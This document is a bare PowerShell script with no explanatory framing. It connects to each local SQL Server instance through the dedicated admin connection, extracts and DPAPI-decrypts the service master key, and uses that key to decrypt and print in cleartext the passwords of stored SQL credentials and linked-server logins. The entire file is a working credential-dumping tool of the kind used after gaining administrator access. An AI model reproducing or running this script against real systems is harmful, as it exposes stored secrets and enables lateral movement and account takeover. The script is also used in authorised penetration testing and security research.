Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

$ComputerName = $env:COMPUTERNAME
$SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances

$Results = New-Object System.Data.DataTable
$Results.Columns.Add("Instance") | Out-Null
$Results.Columns.Add("Credential") | Out-Null
$Results.Columns.Add("User") | Out-Null
$Results.Columns.Add("Password") | Out-Null

foreach ($InstanceName in $SqlInstances) {    
    if ($InstanceName -eq "MSSQLSERVER") {
        $ConnString = "Server=ADMIN:$ComputerName\;Trusted_Connection=True"
    }
    else {
        $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True"
    }

    $Conn = New-Object System.Data.SqlClient.SqlConnection($ConnString)

    try {
        $Conn.Open()
    }
    catch {
        Write-Warning "Couldn't open DAC connection: $($_.Exception.Message)"
        continue
    }

    $SqlCmd = "SELECT substring(crypt_property,9,len(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 AND (thumbprint=0x03 OR thumbprint=0x0300000001)"
    $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn)
    $SmkBytes = $Cmd.ExecuteScalar()

    $RegPath = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql").$InstanceName
    [byte[]]$Entropy = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security").Entropy

    $ServiceKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $SmkBytes,
        $Entropy,
        [System.Security.Cryptography.DataProtectionScope]::LocalMachine
    )

    if ($ServiceKey.Length -eq 16) {
        $Decryptor = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
        $IvLen = 8
    }
    elseif ($ServiceKey.Length -eq 32) {
        $Decryptor = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $IvLen = 16
    }
    else {
        Write-Warning "Unknown key size: $($ServiceKey.Length)"
        $Conn.Close()
        continue
    }

    $SqlCmd = @"
SELECT
    name,
    credential_identity,
    substring(imageval,5,$IvLen) iv,
    substring(imageval,$($IvLen+5),len(imageval)-$($IvLen+4)) pass
FROM sys.credentials cred
INNER JOIN sys.sysobjvalues obj
    ON cred.credential_id=obj.objid
WHERE valclass=28
AND valnum=2
"@

    $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd, $Conn)
    $Reader = $Cmd.ExecuteReader()

    $Dt = New-Object System.Data.DataTable
    $Dt.Load($Reader)

    foreach ($Login in $Dt) {

        $Decryptor.Padding = "None"
        $Decrypt = $Decryptor.CreateDecryptor($ServiceKey,$Login.iv)

        $Stream = New-Object System.IO.MemoryStream (,$Login.pass)
        $Crypto = New-Object System.Security.Cryptography.CryptoStream $Stream,$Decrypt,"Write"

        $Crypto.Write($Login.pass,0,$Login.pass.Length)

        [byte[]]$Decrypted = $Stream.ToArray()

        $Encoding = New-Object System.Text.UnicodeEncoding

        $i = 8
        foreach ($b in $Decrypted) {
            if (
                ($Decrypted[$i] -ne 0 -and $Decrypted[$i+1] -ne 0) -or
                ($i -eq $Decrypted.Length)
            ) {
                $i--
                break
            }
            $i++
        }

        $Decrypted = $Decrypted[8..$i]
        $Password = $Encoding.GetString($Decrypted)

        $Results.Rows.Add(
            $InstanceName,
            $Login.name,
            $Login.credential_identity,
            $Password
        ) | Out-Null
    }

$SqlCmd = @'
SELECT
    srv.srvname AS LinkedServer,
    ls.name AS LoginName,
    SUBSTRING(ls.pwdhash,5,8000) AS PasswordImage
FROM master.sys.syslnklgns ls
INNER JOIN master.sys.sysservers srv
    ON ls.srvid = srv.srvid
WHERE LEN(ls.pwdhash) > 0
'@

$Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn)

$LinkedTable = New-Object System.Data.DataTable
$LinkedTable.Load($Cmd.ExecuteReader())


foreach ($Linked in $LinkedTable) {
    try {

        [byte[]]$IV = $Linked.PasswordImage[0..($IvLen-1)]
        [byte[]]$EncryptedPassword = $Linked.PasswordImage[$IvLen..($Linked.PasswordImage.Length-1)]
        $Decryptor.Padding = "None"
        $Decrypt = $Decryptor.CreateDecryptor($ServiceKey, $IV)
        $Memory = New-Object System.IO.MemoryStream
        $Crypto = New-Object System.Security.Cryptography.CryptoStream(
            $Memory,
            $Decrypt,
            [System.Security.Cryptography.CryptoStreamMode]::Write
        )

        $Crypto.Write($EncryptedPassword, 0, $EncryptedPassword.Length)
        $Crypto.FlushFinalBlock()
        [byte[]]$ClearPassword = $Memory.ToArray()
        $Length = [BitConverter]::ToInt16($ClearPassword, 6)
        $PasswordBytes = $ClearPassword[8..(7+$Length)]
        $Password = (New-Object System.Text.UnicodeEncoding
        ).GetString($PasswordBytes)

        $Results.Rows.Add(
            $InstanceName,
            "LinkedServer: $($Linked.LinkedServer)",
            $Linked.LoginName,
            $Password
        ) | Out-Null

    }
    catch {
        Write-Warning "Couldn't decipher linked server credentials: $($Linked.LinkedServer)"
    }
    }
    $Conn.Close()
}

$Results | Format-Table -AutoSize